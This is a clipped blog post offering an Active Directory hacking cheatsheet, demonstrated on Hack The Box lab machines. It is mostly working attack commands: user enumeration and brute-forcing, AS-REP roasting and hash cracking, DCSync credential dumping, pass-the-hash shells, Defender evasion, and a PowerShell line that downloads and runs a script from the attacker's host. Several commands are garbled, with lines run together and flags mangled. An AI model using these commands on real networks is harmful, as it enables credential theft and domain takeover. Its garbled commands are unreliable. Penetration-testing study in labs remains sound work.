---
title: "Active Directory penetration testing cheatsheet | by Ayrat Murtazin - Freedium"
source: "https://freedium.cfd/https://medium.com/@ayratmurtazin/active-directory-penetration-testing-cheatsheet-37ad5e7e6ebf"
author:
published:
created: 2025-01-21
description: "All you need to know to hack Active directory"
tags:
  - "clippings"
---
As an example, here I used one of the htb boxes

**Before we begin, I extend an invitation for you to join my dividend investing** **[community](https://ayratmurtazin.beehiiv.com/subscribe)****. By joining, you won't miss any crucial articles and can enhance your skills as an investor. As a bonus, you'll receive a complimentary welcome gift: A 2024 Model Book With The Newest Trading Strategies (both Options and Dividends)**

### 1) Get the domain name:

crackmapexec smb 10.10.10.175

smbmap -H 10.10.10.175 -u '' -p ''

### 2) Try to get users' lists:

[GetADUsers.py](http://getadusers.py/) egotistical-bank.local/ -dc-ip 10.10.10.175 -debug

![None](https://miro.medium.com/v2/resize:fit:700/0*z-PdWAxVebXJHTXh.png)

### Lightweight Directory Access Protocol (LDAP)

./windapsearch.py -U — full — dc-ip 10.10.10.182

The command above will list out all users in the domain.

![None](https://miro.medium.com/v2/resize:fit:700/0*g11bBqiyGAC6omMK.png)

### 3) Enumerate shares:

![None](https://miro.medium.com/v2/resize:fit:700/0*VLAAhf5QwyCWGrIS.png)

### 4) Get usernames' lists from the website's team's names:

./username-anarchy — input-file fullnames.txt — select-format first,flast,first.last,firstl > unames.tx

![None](https://miro.medium.com/v2/resize:fit:700/0*ggClIdHBMIqj5O_6.png)

### 5) Another attempt to get users' list:

![None](https://miro.medium.com/v2/resize:fit:700/0*wRsFYdKAKQLKhDOe.png)

### 6) To get the domain base:

ldapsearch -x -h 10.10.10.175 -s base namingcontexts

![None](https://miro.medium.com/v2/resize:fit:700/0*s2ezyYkWlxpPfFeS.png)

### 7) To get more information about domain:

ldapsearch -x -h 10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'

![None](https://miro.medium.com/v2/resize:fit:700/0*oMbp9QMpBnRo1VpI.png)

### 8) Brute-force users on the domain:

kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt — dc 10.10.10.175

### 9) Get Hash

I'll use the list of users I collected from Kerbrute, and run [GetNPUsers.py](http://getnpusers.py/) to look for vulnerable users. Three come back as not vulnerable, but one gives a hash:

[GetNPUsers.py](http://getnpusers.py/) 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175

![None](https://miro.medium.com/v2/resize:fit:700/0*wrrC6QQCo9g9bFjY.png)

### 10) Crack Hash

hashcat -m 18200 hashes.aspreroast /usr/share/wordlists/rockyou.txt — force

![None](https://miro.medium.com/v2/resize:fit:700/0*z1M_sEUod3SqbKwf.png)

### 11) Bloodhound

I ran `winPEAS.exe` again, but nothing new jumped out at me. Since there's AD stuff going on, I went to [Bloodhound](https://github.com/BloodHoundAD/BloodHound).

### Download / Install

I'll clone the repository into `/opt`, and also got the latest release binary. I'll start `neo4j` (`apt install neo4j` if it's not already installed) with `neo4j start`, and then run Bloodhound. If you're running as root, you'll need the `-no-sandbox` flag.

If it's a fresh install (or if you forget your password from a previous install, you can delete `/usr/share/neo4j/data/dbms/auth` and then it's like a fresh install), I'll need to change the `neo4j` password by running `neo4j console`, visiting the url it returns, and logging in with the default creds, neo4j/neo4j. It'll force a password change them at that point. Now the BloodHound program can connect, thought first I need data.

### Run SharpHound.exe

Before I can do analysis in BloodHound, I need to collect some data. I'll grab `SharpHound.exe` from the injestors folder, and make a copy in my SMB share. Then I can run it right from there, and the output will write into the share as well:

![None](https://miro.medium.com/v2/resize:fit:700/0*tHmTzKpHWVyWk82a.png)

### Analyze Results

I'll import the `.zip` file into BloodHound by clicking the Upload Data button on the top right. Tt reports success, leaving me at a blank page. There are canned queries that might be useful, but I like to start with the user(s) I already have access to. I'll search for SVC\_LOANMGR@EGOTISTICAL-BANK.LOCAL in the bar at the top left, and it comes up on the graph. On the left, I'll want to look for Outbound Object Control - These are items that this user has rights over. In this case, there is one:

![None](https://miro.medium.com/v2/resize:fit:700/0*-ZtKH2IRFW2NqVBk.png)

Clicking the "1" add that item to the graph:

![None](https://miro.medium.com/v2/resize:fit:700/0*_9MT3CULG5c61Qd3.png)

This account has access to GetChanges and GetChangesAll on the domain. Googling that will quickly point to a low of articles on the DCSync attack, or I can right click on the label (you have to get in just the right spot) and get the menu for it:

Clicking help, there's a Abuse Info tab that includes instructions for how to abuse this privilege:

![None](https://miro.medium.com/v2/resize:fit:700/0*trgz1gJEmdLha5mp.png)

### 12) DCSync

### secretsdump

My preferred way to do a DCSync attack is using `secretsdump.py`, which allows me to run DCSync attack from my Kali box, provided I can talk to the DC on TCP 445 and 135 and a high RPC port. This avoids fighting with AV, though it does create network traffic.

I need to give it just a target string in the format `[username]:[password]@[ip]`:

[secretsdump.py](http://secretsdump.py/) 'svc\_loanmgr:Moneymakestheworldgoround!@10.10.10.175'

![None](https://miro.medium.com/v2/resize:fit:700/0*17mptR1Z4ctjLB0v.png)

### 13) Shell

[psexec.py](http://psexec.py/) -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip 10.10.10.175 [administrator@10.10.10.175](https://freedium.cfd/https://medium.com/@ayratmurtazin/)

![None](https://miro.medium.com/v2/resize:fit:700/0*t2s7gNESi7wWPUa9.png)

### DCSync Attack V2

![None](https://miro.medium.com/v2/resize:fit:700/0*aiv4pFJycWpU12Eo.png)

![None](https://miro.medium.com/v2/resize:fit:700/0*4UB8q1SOAHTMr-s0.png)

```bash
net user john abc123! /add /domainnet group "Exchange Windows Permissions" john /addnet localgroup "Remote Management Users" john /add
```

The commands above create a new user named john and add him to the required groups. Next, download the PowerView script and import it into the current session.

![None](https://miro.medium.com/v2/resize:fit:700/0*T8i3ZXE5wJrOD1L8.png)

menu > Bypass-4MSI

The Bypass-4MSI command is used to evade defender before importing the script. Next, we can use the Add-ObjectACL with john's credentials, and give him DCSync rights.

![None](https://miro.medium.com/v2/resize:fit:700/0*ISAu4fSNfZNZQE_e.png)

```php
IEX(New-Object Net.WebClient).downloadString('[<http://10.10.14.11/PowerView.ps1>](<http://10.10.14.11/PowerView.ps1>)')$pass = convertto-securestring 'abc123!' -asplain -force$cred = new-object system.management.automation.pscredential('htb\\john', $pass)Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity john -Rights DCSync
```

After run:

[secretsdump.py](http://secretsdump.py/) htb/john@10.10.10.161

where htb is domain

The script from Impacket can now be run as john, and used to reveal the NTLM hashes for all domain users.

![None](https://miro.medium.com/v2/resize:fit:700/0*JqZS4V4D09vLsT1b.png)

The obtained Domain Admin hash can be used to login via psexec.

➡️Subscribe Me here ➡️ **[https://medium.com/@ayratmurtazin/subscribe](https://medium.com/@ayratmurtazin/subscribe)**

I've got a lot to share in my upcoming blogs.